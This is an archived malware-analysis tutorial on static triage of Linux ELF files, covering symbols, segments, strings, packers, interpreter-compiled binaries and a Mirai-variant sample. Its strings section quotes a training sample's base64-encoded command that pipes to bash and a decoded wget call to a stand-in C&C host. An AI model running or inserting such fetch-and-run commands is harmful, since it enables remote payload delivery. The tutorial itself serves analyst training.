{
    "id": "256d8883-4f7d-4f1e-9440-82c20c118671",
    "created_at": "2023-01-12T15:07:47.490371Z",
    "updated_at": "2025-03-27T02:17:01.057015Z",
    "deleted_at": null,
    "sha1_hash": "60d93b46e89d110d86cbaec537d3aaf17acbce73",
    "title": "2020-08-19 - ELF Malware Analysis 101 Part 2- Initial Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T15:51:25Z",
    "file_modification_date": "2022-05-28T15:51:25Z",
    "file_size": 7222230,
    "plain_text": "# ELF Malware Analysis 101 Part 2: Initial Analysis\n\n**[intezer.com/blog/linux/elf-malware-analysis-101-initial-analysis](https://www.intezer.com/blog/linux/elf-malware-analysis-101-initial-analysis)**\n\nWritten by Avigayil Mechtinger - 19 August 2020\n\n## Get Free Account\n\nJoin Now\n\n## Top Blogs\n\n**Introduction**\n\n\nAugust 19, 2020\n\n\nIn the [previous article we profiled the ELF malware landscape and explained how malware](https://www.intezer.com/blog/linux/elf-malware-analysis-101-linux-threats-no-longer-an-afterthought/)\ninfects systems. We discussed the current lack of ELF malware visibility, reflected in subpar\ndetection rates by leading engines and the shortage of publicly available resources\ndocumenting Linux threats. In this article we will pursue ELF file analysis with an\n**emphasis on static analysis.**\n\n\n-----\n\nThe purpose of initial analysis is to gather as many insights about a file as possible without\nspending too much time on advanced analysis techniques such as behavioral analysis.\n\nThe initial analysis process entails reviewing different artifacts of a file. While an artifact by\nitself might not be enough to make a decision, the collection of artifacts can help us\ndetermine a practical outcome for this step. A final result could be that we know what the file\nis or we must conduct a deeper analysis because this step wasn’t conclusive enough.\n\n**Agenda**\nThe lack of valuable metadata in ELF files, such as certificates and resources, provides a\nweaker starting point than PE files, particularly when distinguishing between trusted and\nmalicious files. This is why it’s important to consider the context of the analyzed file and the\ndesired outcome from the analysis. Whether you want to verify that a file is trusted or\nmalicious, or you already know that a file is malicious but you want to classify the threat to\ndetermine the appropriate response, the information and tools presented in this article will\nhelp you further support an initial analysis conclusion.\n\nWe will review the following artifacts and emphasize how they can help us gather insights\nabout a file:\n\n1. ELF format static components\n\n1. Symbols\n2. Segments and Sections\n3. ELF Header\n2. File’s Output\n3. Strings\n4. Code Reuse\n5. Packers\n6. Interpreters\n\nAfter covering our initial analysis toolset, we will put them to use by analyzing real samples\nfound in the wild.\n\n**Toolset**\nThese are the tools and commands we will use (in alphabetical order). We will elaborate on\neach of them later.\n\n[1. Detect It Easy](http://ntinfo.biz/index.html)\n[2. ElfParser](http://elfparser.com/)\n[3. Intezer Analyze](https://analyze.intezer.com/)\n[4. Linux VM](https://itsfoss.com/install-linux-in-virtualbox/)\n[5. objcopy](https://linux.die.net/man/1/objcopy)\n[6. Pyinstaller](https://www.pyinstaller.org/)\n[7. readelf](https://linux.die.net/man/1/readelf)\n[8. shc](https://github.com/neurobin/shc)\n\n\n-----\n\n[9. strings](https://linux.die.net/man/1/strings)\n[10. UnSHc](https://github.com/yanncam/UnSHc)\n\n[11. UPX](https://upx.github.io/)\n[12. VMprotect](http://vmpsoft.com/)\n\n**Getting Started**\nWe will use a Linux virtual machine (VM) as our demo environment. If you don’t have a Linux\n[VM, follow this guide to install one: https://itsfoss.com/install-linux-in-virtualbox/.](https://itsfoss.com/install-linux-in-virtualbox/)\n\nWe will also be compiling different samples. If you are not interested in this step, we have\n[stored the compiled samples in a dedicated repository for your convenience. We will refer to](https://github.com/intezer/ELF-Malware-Analysis-101/tree/master/Part-2-Initial-Analysis)\nthe samples throughout the article.\n\nLet’s prepare our environment:\n\n1. Run your VM.\n[2. If you have just installed the VM, make sure to take a snapshot of the machine so you](https://www.sysnettechsolutions.com/en/take-snapshot-virtualbox-windows-10/)\n\ncan always restore it to its clean snapshot.\n3. Allow the shared clipboard to transfer from the Host to Guest:\n\n\n-----\n\n[4. Compile the following code (you can download the compiled file from here):](https://github.com/intezer/ELF-Malware-Analysis-101/blob/master/Part-2-Initial-Analysis/Article-samples/training_sample.c)\n\n1. Run nano training_sample.c, copy the code, and save (ctrl+x)\n2. Run gcc training_sample.c -o training-sample\n\n**ELF Format Static Components**\n\nIn this section we will review the components of the ELF format that are relevant for initial\nanalysis, using our compiled file.\n\nWhen analyzing static features of an ELF file, readelf command is the most useful tool.\n**readelf should already be installed on your Linux VM. Run readelf -h to review all of its**\npotential flags. We will use this command throughout the article.\n\n**Symbols**\n\n**Definition and how they can help us:**\n\nSymbols describe data types such as functions and variables which are stored in the source\ncode and can be exported for debugging and linking purposes. Symbols can help us uncover\nwhich functions and variables were used by the developer in the code giving us a better\n\n\n-----\n\nunderstanding of the binary s functionalities. We might also find unique function or variable\nnames that can be searched for online to determine if this is a known file—in other words, if\nsomeone has already analyzed a similar binary, or if this is an open source tool.\n\n**In practice:**\nLet’s use the readelf command to read the file’s symbols.\n\nFirst, run: readelf -s training-sample\n\nYou will notice the output contains two tables: .dynsym and .symtab. The .dynsym table\n(dynamic symbols table) exists in dynamically linked and shared object files.\n\nDynamically linked binaries use external sources such as libc libraries that are stored on the\noperating system during runtime. Statically linked binaries, on the other hand, are compiled\ntogether with these libraries. This means statically linked files will typically be larger than\ndynamically linked files. Statically linked files will likely contain large amounts of code that are\nrelated to libraries and not to the actual file’s logic.\n\nThe .dynsym table contains the dynamically linked symbols, such as libc functions, and the\n**.symtab table contains all symbols (including those in the .dynsym table) that were defined**\nin the source code. In the image above, you can see the libc function used in our source\ncode under the .dynsym table: fgets(), popen(), and system().\n\nThe symbol table can be lengthy. For simplicity, let’s view each symbol type separately.\n\n1. OBJECT: global variables declared in the code.\n2. FUNC: functions declared in the code.\n3. FILE: the source files that are compiled in the binary (This is a debug symbol. If the file\n\nwas stripped from debug symbols, the symbols table won’t contain this type)\n\n**readelf -s training-sample | grep OBJECT**\n\n\n-----\n\nAbove we can see the global variables that were declared in the file’s source code.\n\n**readelf -s training-sample | grep FUNC**\n\nWe can also observe the functions declared in the file’s source code, together with the used\nlibc functions. The libc functions are present in both .dynsym and .symtab tables, which is\nwhy we see them both listed twice.\n\n**readelf -s training-sample | grep FILE**\n\n\n-----\n\nThe source files compiled in the binary are our source code (training_sample.c) and the\n**ctrstuff.c file. The ctrstuff.c source code is compiled as default inside the binary. It contains**\nfunctions that are used to run before and after the file’s main logic (register_tm_clones,\n**register_tm_clones, and frame_dummy for example).**\n\n**Bottom Line**\nBy interpreting the file’s symbols, you can extract the marked functions and variables from\nthe compiled training sample’s source code:\n\n[Browse here for more context about symbols.](https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/)\n\n**Segments and Sections**\n\n**Definition and how they can help us:**\n\nSegments, also known as program headers, describe the binary’s memory layout and they\n\n\n-----\n\nare necessary for execution. In some cases, anomalies in the segments table structure can\nhelp us determine if the binary is packed, or if the file was self-modified (a file infector for\ninstance).\n\nSegments can be divided into sections for linking and debugging purposes. The sections are\ncomplementary to the program headers and they are not necessary for the file’s execution.\nSymbols are usually retrieved via section information. Unique section names can help us\nidentify different compilation methods.\n\n**In practice:**\nLet’s review the training sample segments. Run readelf -l training-sample:\n\n\n-----\n\nThere are 9 program headers (segments) in the training sample. Each segment type\ndescribes a different component of the binary. We will focus on the PT_LOAD segment.\n\n**PT_LOAD segment describes the code which is loaded into memory. Therefore, an**\nexecutable file should always have at least one PT_LOAD segment. In the screenshot above\nyou will see the training sample contains 2 PT_LOAD segments. Each segment has different\nflags:\n\n1. RE (read and execute) flags: This is the PT_LOAD segment that describes the\n\nexecutable code. The file’s entrypoint should be located inside this segment.\n2. RW (read and write) flags: This is the PT_LOAD segment that contains the file’s\n\nglobal variables and dynamic linking information.\n\nIn the segments’ output we are also given a list of sections to segments mapping, in\ncorresponding order to the segments table. Notice the .text section, which contains the\nexecutable code instructions, is mapped to the PT_LOAD R E segment.\n\nThe segments table structure of the training sample is an example of a “normal” structure.\nIf the file was packed or self-modified, we would see the table structured differently.\n\nThis is an example of a segments table of a packed file:\n\nThe table contains only 3 segments: 2 PT_LOAD segments and a PT_GNU_STACK. The\nexistence of PT_GNU_STACK indicates to the linker if the file needs an executable stack\n(this is also why its size is zero). This is not a typical structure for an ELF Program Headers\ntable.\n\n**Bottom Line**\n\nSegments:\n\nAnomalies in a file’s segment table can be:\n\n1. Segment types and count: The file contains only PT_LOAD segments (and\n\n**PT_GNU_STACK).**\n2. Flags: The file contains a segment that has all 3 flags (RWE). We will use these\n\nanomalies in the packers section.\n\n\n-----\n\nSections: We will review examples of unique section names in the packers and\ninterprets sections.\n\n[Browse here for more information about ELF segments and sections.](https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/)\n\n**Note:**\nMalware developers often strip or tamper with a file’s symbols and/or sections to make it\nmore difficult for researchers to analyze the file. This makes it nearly impossible to debug the\nbinary.\n\nThe following is a method a developer might use to strip a file’s symbols:\n\n1. Run objcopy -S training-sample training-sample-stripped\n2. Run readelf -s training-sample-stripped and you will see there is only a dynamic\n\nsymbol table.\n\nStrip utilities may also leave the sections and patch fields in the ELF header (e_shoff: offset\nof the section header table and e_shnum: the number of section headers). As a result, the\nbinary will be detected as having no sections.\n\n**ELF Header**\nThe ELF header contains general data about the binary such as the binary’s entry point and\nthe location of the program headers table. This information is not valuable during the initial\nfile analysis but the file’s architecture can help us understand which machine the file is\ndesigned to run on, in case we want to run the file.\n\nLet’s run readelf -h training-sample in order to view the sample’s header info:\n\nThere are several advanced malware techniques that leverage the ELF header’s structure.\n\n[If you would like to learn more about this topic, watch ELF Crafting presented by Nacho](https://www.youtube.com/watch?v=adYOSO0tn9M&feature=emb_title)\nSanmillan at r2con.\n\n\n-----\n\n**File s Output**\nSimply running the file on your VM can always be useful. If the file presents an output, it\nmight immediately help us to determine what it is.\n\nTip: Before running the file make sure you have saved a clean snapshot of your VM.\n\n**Strings**\nStrings extraction is a classic and powerful method for gathering information about a binary.\nLet’s run the strings command on our file and extract the strings into a txt file for\nconvenience:\n**strings training-sample > str.txt**\n\nWhen we review the strings, we will see declared chars from the code together with the\nsymbols and other strings that are related to the file’s format, such as section names and the\nrequested interpreter.\n\nLike in PE analysis, we can search for indicative strings such as network related strings,\nencoded strings (such as base64 or hex), paths, commands, and other unique key words\nthat might help us understand more about the file.\n\nIn the training file, the echo command string that contains the base64 command string\nimmediately stands out:\n\n**echo**\n**d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64**\n**-d |bash;**\n\nIf we decode the base64 string, we will receive the following command:\n\n**wget http://somenonexitingcnc[.]com/malware.app**\n\nWe can assume the file drops a payload from a remote C&C.\n\n**String Reuse**\n[Intezer Analyze is a useful tool for string extraction. It reduces analysis efforts by divulging](https://analyze.intezer.com/)\nwhether certain strings have been seen before in other files. In the case of an unknown\nmalware, filtering the common strings can help us focus our efforts on the file’s unique\nstrings.\n\nFor example:\nLazarus’s [ManusCrypt ELF version contains some of the same strings found in its PE](https://analyze.intezer.com/files/0a7e7f99dd778cef86050d4ff436f209bd894ebb63faeb16ec0a92876ab81094)\nversion, which was previously reported by the U.S. government:\n\n\n-----\n\nYou can easily browse the PE version to compare the two files using the related samples in\nIntezer Analyze:\n\n**Code Reuse**\n\n[Examining code reuse in Intezer Analyze can be a great starting point for initial analysis. It](https://analyze.intezer.com/)\ncan expedite analysis time by disclosing where certain code has been used before in other\nfiles.\n\nFor example:\n\nThis [Rekoobe sample had 0 detections in VirusTotal. Upon upload to Intezer Analyze we](https://analyze.intezer.com/files/a8b069ef9d76cd42e873c6e8ded9db8c17d9d0ce234b5e7c9a126b4d514c6f72)\nreceive a clear verdict (malicious) and classification (Rekoobe) based on code reuse to\nprevious samples.\n\n\n-----\n\n**Packers**\n\nUnlike PE malware, where it’s common for known payloads to be packed with evasive and\ninconstant packers (polymorphic custom packers), this is rare in ELF malware. One\nexplanation might be that the ongoing ‘cat-and-mouse’ game between security companies\nand malware developers is still in its infancy, as companies are starting to embrace Linuxfocused detection and protection platforms for their systems.\n\nHowever, the famous UPX is highly used by ELF malware developers. In this section we will\nreview ELF packers, determine how we can identify if a file is packed, and understand what\nare our next steps if the file is indeed packed. We will focus on UPX and VMprotect, as they\nare the most commonly used packers.\n\n**Vanilla UPX**\n\nFiles packed with Vanilla UPX are easy to detect and unpack.\n\nLet’s try it ourselves by packing the training file with UPX (you can download the compiled file\nform here):\n\n1. First, we must make the file larger by compiling it as a statically linked binary (UPX has\n\na minimum file size and this file is currently too small).gcc -static training_sample.c **o training-sample-static**\n\n1. Run: upx -9 training-sample-static -o training-sample-static-packed\n\nRun readelf -a training-sample-static-packed to retrieve the file’s data. You will notice that\nthere are only header and segments tables. These tables are necessary for the file to run.\n\n\n-----\n\nThe segment table contains only PT_LOAD and PT_GNU_STACK segments. This is an\nanomaly in the segment tables structure that might indicate the file is packed.\n\nLet’s run the strings command on the file. Notice that the majority of the strings are gibberish,\nhowever, we have an indication that the file is packed with UPX.\n\nThe strings, together with the file’s table structure, indicates the file is probably packed with\nUPX.\n\nLet’s use the [Detect It Easy (DIE) tool. DIE is a signature-based tool that detects a file’s](http://ntinfo.biz/index.html)\ncompiler, linker, packer, and more. Open the file with this tool and you will see it immediately\nidentifies the file as UPX packed.\n\n\n-----\n\nNow, let’s check out DIE’s [Entropy feature:](https://reverseengineering.stackexchange.com/questions/21555/what-is-an-entropy-graph/21558)\n\n\n-----\n\nIf a file is packed with Vanilla UPX, unpack it by running\n**upx -d training-sample-static-packed and then continue your analysis using the unpacked**\nfile.\n\n**Custom UPX**\nSince UPX is open sourced, it’s easy to modify and add advanced layers to the packing\nprocess. In order to detect files that are packed with custom UPX, we can use the same\ndetection methods used for Vanilla UPX. However, there might not always be an indicative\n[string which can disclose that a file is probably packed with UPX. For example, Rocke uses](https://www.fortinet.com/blog/threat-research/rocke-variant-ready-to-box-mining-challengers)\nLSD! instead of the original UPX! header. Although it’s one of the most simple tricks in\nCustom UPX, it evades static parsers rather easily.\n\n[Code reuse can also simplify packer detection. Check out this modified UPX example. It](https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Article-samples/modified_upx_sample)\n[contains no string signatures but if we open it in Intezer Analyze it’s clear the file is packed](https://analyze.intezer.com/files/3d1650fe601e705d4bb2c4d197eeb0fb56fba0479df98dbd159dcbd15ee12f7e)\nwith modified UPX.\n\nFiles packed with modified UPX will most likely not unpack with the upx -d command. In this\ncase, we should proceed to dynamic analysis.\n\n**VMprotect**\n\nVMprotect packer is a popular packing choice for PE files and it also has a packing solution\nfor ELF files.\n\nYou can try it yourself by using the demo version. Execute the following commands to\n[download VMprotect onto your VM and run it (download the compiled file form here):](https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Article-samples/training-sample.vmp.app)\n\n**wget http://vmpsoft.com/files/VMProtectDemo_x64.tar.gz**\n\n**mkdir VMprotect**\n\n**tar -xf VMProtectDemo_x64.tar.gz -C VMprotect**\n\n**cp training-sample training-sample.app**\n\n**cd VMprotect**\n**./vmprotect_gui**\n\nThe VMprotect GUI should open. Choose “Open..” and then select “training-sample.app”.\n\nTake a look at “VM Segment” in the “Options” setting. This “.vmp” field can be changed to\nany value the user decides. We will change it to “cat”. Next, click on the play button.\n\n\n-----\n\nThe program has created a packed sample on your working directory. Run readelf -l\n**training-sample.vmp.app to view the packed file’s segments.**\n\nNotice the file now has a PT_LOAD segment with RWE flags and the file’s entrypoint is\ninside this segment (the entrypoint address should be located somewhere between the\nsegment’s virtual address and its memory size). You can see that the VMprotect section cat1\n\n\n-----\n\nis located inside this segment as well.\n\nRun readelf -S training-sample.vmp.app to view the file’s sections.\n\nVMprotect will create 2 new sections with the same name and suffixes of 1 and 0,\nrespectively. The section names and the RWE segment combined with high entropy can\ndisclose that a file is packed with VMprotect. If a file is packed with VMprotect, we should\nproceed to dynamic analysis.\n\nNote: If you review the symbols, you will see the functions and variables related to the\npayload no longer appear in the table. This makes sense considering the payload is packed\nand the file we are analyzing right now is the packer and not the payload.\n\n**Other Packers**\n\nThere are several open source projects for ELF packers. Here are some examples:\n\n[https://github.com/ps2dev/ps2-packer](https://github.com/ps2dev/ps2-packer)\n\n[https://github.com/n4sm/m0dern_p4cker](https://github.com/n4sm/m0dern_p4cker)\n\n[https://github.com/timhsutw/elfuck](https://github.com/timhsutw/elfuck)\n\n**Bottom Line**\n\nWe suspect a file is packed when it has:\n\n1. Packer code reuse\n2. High entropy\n3. Segment anomalies\n4. Large amounts of gibberish strings\n5. Packer signature such as UPX strings and VMprotect sections names\n\nNext steps will be:\n\n1. If there is an unpacking solution, we will unpack the file and analyze it.\n2. If there isn’t an available unpacking solution, we will proceed to dynamic analysis.\n\n**Interpreters**\n\nInterpreters are programs that compile scripts to an executable. ELF files that were compiled\nwith interpreters hold a compiled script within the binary. Interpreters can also be considered\nas “script obfuscators”, since the ELF file is just “wrapping” the clear-text source script.\n\nLet’s review two commonly used interpreters:\n\n\n-----\n\n[1. Pyinstaller: Compiles python.](https://www.pyinstaller.org/)\n[2. shc: Shell script compiler.](https://github.com/neurobin/shc)\n\n**Pyinstaller**\nFiles that were compiled with Pyinstaller will have the pydata section name. This is where\nthe script’s pyc (compiled python source code) is placed in the ELF binary. Another way to\ndetect Pynistaller binaries is via strings. The interpreter has unique strings such as “Error\n[detected starting Python VM”. Take a look at this YARA rule.](https://github.com/intezer/ELF-Malware-Analysis-101/blob/master/Part-2-Initial-Analysis/YARA/interpretes.yar)\n\n[Code reuse is also helpful for detecting Pyinstaller compiled files:](https://analyze.intezer.com/files/06ad6831768fb9d04b5cbecce9753bab3be487992936eb82a00d8f77fb4b11bf)\n\n[We can extract the python script from the ELF binary by using pyinstxtractor. Follow](https://github.com/extremecoders-re/pyinstxtractor) this\nguide on how to apply it to ELF files. Note that the python version you use to run\n[pyinstxtractor should be the same version used in the binary you are analyzing. If there is a](https://github.com/extremecoders-re/pyinstxtractor)\nmismatch, [pyinstxtractor will issue a warning.](https://github.com/extremecoders-re/pyinstxtractor)\n\n[Let’s try it ourselves (download the compiled file form here):](https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Article-samples/test_pyinstaller)\n\nFirst, let’s compile a Pyinstaller file:\n\n1. Install Python and Pyinstaller on your VM:sudo apt update\n\n**sudo apt install -y python3**\n\n**sudo apt install -y python3-pip**\n\n**sudo pip3 install pyinstaller**\n\n1. Create a simple python script code with test_pyinstaller.py:nano\n\n**test_pyinstaller.pyCopy the following script to test_pyinstaller.py:for i in range(1,6):**\n\n**print(f”this is output #{i}”)And save (ctrl+x).**\n\n\n-----\n\n1. Compile the file with Pyinstaller:pyinstaller –onefile test_pyinstaller.pyPyinstaller\n\ncreated 2 directories in the source folder: dist and build. The compiled file is in the\n**/dist directory. You can run the file and also examine the pydata section and its strings.**\n\nExtraction of the python script from the compiled binary:\n\n[1. Download pyinextractor and](https://github.com/extremecoders-re/pyinstxtractor) [uncompyle6:sudo apt install -y git](https://pypi.org/project/uncompyle6/)\n\n**git clone https://github.com/extremecoders-re/pyinstxtractor.git**\n\n**sudo pip3 install uncompyle6**\n\n1. Dump the pydata section using objcopy. This section holds the pyc (Python bytecodes).\n\nLet’s work in a clean directory.mkdir training-pyinstaller\n\n**cd training-pyinstaller**\n\n**objcopy –dump-section pydata=pydata.dump ../dist/test_pyinstaller**\n\n\n-----\n\n1. Run pyinstxtractor on the pydata dump:python3 ../pyinstxtractor/pyinstxtractor.py\n\n**pydata.dumpYou should receive the following output:**\n\npyinstxtractor created a directory named pydata.dump_extracted. Please note that\nthe tool suggests possible entry points (in our example we know its\n**test_pyinstaller.pyc).**\n\n1. Decompile the relevant pyc file using uncompyle6. uncompyle6 is a Python decompiler\n\nthat translates Python bytecode to equivalent Python source code:cd\n**pydata.dump_extracted**\n\n**uncompyle6 test_pyinstaller.pycWe have now successfully extracted the Python**\ncode:\n\n**shc**\n\n[shc is a shell script compiler. Files that were compiled with shc have specific strings. You can](https://github.com/neurobin/shc)\nuse the [YARA signature to detect them along with code reuse. UnSHc tool can be used to](https://github.com/intezer/ELF-Malware-Analysis-101/blob/master/Part-2-Initial-Analysis/YARA/interpretes.yar)\nextract the compiled bash script from files that were compiled with older shc versions (there\ncurrently isn’t a public solution for extracting the script from later versions of this tool).\n\n**Bottom Line**\n\nWe suspect a file is an interpreter when the file has:\n\n1. Interpreter code reuse\n2. High entropy (in some cases)\n3. Interpreter signature such as unique strings and section names\n\n\n-----\n\nNext steps will be:\n\n1. If there is a script extraction solution, we will run it on the binary.\n2. If there isn’t an available script extraction solution, we will proceed to dynamic analysis.\n\n**ELFparser Tool**\n[Elfparser is an open source project which as of this publication date hasn’t been updated in](http://elfparser.com/)\nthe last few years. With that being said, this tool is useful for initial analysis when you want to\nsearch for suspects and indicators of the file’s functionalities. In addition to parsing the ELF\nfile to its various tables which are relevant for initial analysis, the tool contains embedded\nsignatures based on the file’s static artifacts which are translated to “capabilities”. These\ncapabilities are then translated to a final score. The higher the score, the more suspicious the\nfile is. This score should be taken with slight skepticism, as the indicator is prone to false\npositives and trusted files can also come up as highly suspicious.\n\nLet’s upload our training file to the ELFparser tool:\n\nIt maps the system and popen function to their relevant categories and recognizes the\nembedded IP address.\n\n**Real Life Sample Analysis**\nNow, the moment you have been waiting for. In this section, we will analyze a real ELF\nmalware sample and you will be given 3 additional samples so you can practice initial ELF\n[analysis on your own time. You can find the exercise samples here.](https://github.com/intezer/ELF-Malware-Analysis-101/tree/master/Part-2-Initial-Analysis/Real-life-examples/Exercise)\n\n[Let’s download this sample and open it with ELFparser so that we can obtain an initial](https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Real-life-examples/Example/8cb7b286f4284afccee5f9b9e2ac143fc954c377ef2891474feccb0b223a9537.sample)\noverview of the file.\n\n\n-----\n\nElfparser recognizes the file as UPX packed. Let’s unpack the file using upx -d.\n\nNow that we have unpacked the file, let’s open it again in ELFparser. You can see that the\nfile has symbols and ELFparser has gathered some capabilities:\n\n\n-----\n\nThe file is likely generating HTTP requests as part of its functionality. The User-Agent and\nHost headers are variables (based on %s).\n\nLet’s run the strings command on the file.\n\nThe file contains a great deal of strings which look like user agents. We can assume they\nmight be related to the HTTP request identified by ELFparser and that the binary is using\ndifferent user agents to avoid being blocked by the host that it’s attempting to contact.\n\nAt this point, we may suspect that we are not dealing with a trusted file and that it might also\nbe related to some DDoS malware, but we should gather more information first before\nmaking this conclusion.\n\nLet’s look at the file’s symbols. Because it contains many symbols, use readelf and grep\neach symbol type separately.\n\n**readelf -s training-sample | grep FUNC**\n\nThe file contains some unusual and suspicious function names:\n\n**FindRandIP, tcpFl00d, udpfl00d**\n\nWe can almost certainly conclude that this file is a malware. Let’s do a quick google search\nfor these unique functions so we can classify the file. We receive search results for Mirai and\nGafgyt analysis. It’s now clear that this file is a botnet which is a variant of Mirai.\n\n**Golang Files**\n\n[There is a new trend we are seeing where ELF malware is written in Golang. Kaiji,](https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/)\n[NOTROBIN, and](https://www.fireeye.com/blog/threat-research/2020/01/vigilante-deploying-mitigation-for-citrix-netscaler-vulnerability-while-maintaining-backdoor.html) [Kinsing are just some examples.](https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability)\n\nGolang files have a different structure than classic ELF files. We will soon publish an article\nexplaining the ELF Golang format and how to analyze these binaries. Stay tuned!\n\n\n-----\n\n**Conclusion**\nWe reviewed initial ELF analysis with an emphasis on static analysis. We detailed the\ndifferent artifacts and components that are relevant for initial analysis and learned how they\ncan help us gather immediate insights about a file. We also explained which tools can be\nused to gather those insights.\n\nInitial analysis is the first step you should take when approaching a file but it’s not always\nenough to determine a file’s verdict and classify the threat if it’s malicious. A file can be\npacked, stripped, or just not informative enough to make an assessment during the initial\nanalysis phase. In part 3, we will review the next step in ELF file analysis: dynamic analysis.\nYou will learn what information can be extracted from this step and which tools can be used\nto gather it.\n\n**Avigayil Mechtinger**\nAvigayil is a product manager at Intezer, leading Intezer Analyze product lifecycle. Prior to\nthis role, Avigayil was part of Intezer's research team and specialized in malware analysis\nand threat hunting. During her time at Intezer, she has uncovered and documented different\nmalware targeting both Linux and Windows platforms.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-19 - ELF Malware Analysis 101 Part 2- Initial Analysis.pdf"
    ],
    "report_names": [
        "2020-08-19 - ELF Malware Analysis 101 Part 2- Initial Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "7c053836-8f50-4d40-bc5c-7088967e1b57",
            "created_at": "2022-10-25T16:07:24.549525Z",
            "updated_at": "2025-03-27T02:02:10.278474Z",
            "deleted_at": null,
            "main_name": "Rocke",
            "aliases": [
                "Aged Libra",
                "Iron Group",
                "Rocke"
            ],
            "source_name": "ETDA:Rocke",
            "tools": [
                "Godlua",
                "Kerberods",
                "LSD",
                "Pro-Ocean",
                "Xbash"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "905eabd9-2b7f-483d-86bd-0c72f96b4162",
            "created_at": "2023-01-06T13:46:39.02749Z",
            "updated_at": "2025-03-27T02:00:02.980813Z",
            "deleted_at": null,
            "main_name": "Rocke",
            "aliases": [
                "Aged Libra"
            ],
            "source_name": "MISPGALAXY:Rocke",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0b02af5f-2027-42b7-a6f2-51e2fd49ba7f",
            "created_at": "2022-10-25T15:50:23.360509Z",
            "updated_at": "2025-03-27T02:00:55.45329Z",
            "deleted_at": null,
            "main_name": "Rocke",
            "aliases": [
                "Rocke"
            ],
            "source_name": "MITRE:Rocke",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e16a6567-2b9a-4419-960b-1e03fccc8812",
            "created_at": "2023-01-06T13:46:39.128684Z",
            "updated_at": "2025-03-27T02:00:03.003292Z",
            "deleted_at": null,
            "main_name": "NOTROBIN",
            "aliases": [],
            "source_name": "MISPGALAXY:NOTROBIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536067,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653753085,
    "ts_modification_date": 1653753085,
    "files": {
        "pdf": "https://archive.orkl.eu/60d93b46e89d110d86cbaec537d3aaf17acbce73.pdf",
        "text": "https://archive.orkl.eu/60d93b46e89d110d86cbaec537d3aaf17acbce73.txt",
        "img": "https://archive.orkl.eu/60d93b46e89d110d86cbaec537d3aaf17acbce73.jpg"
    }
}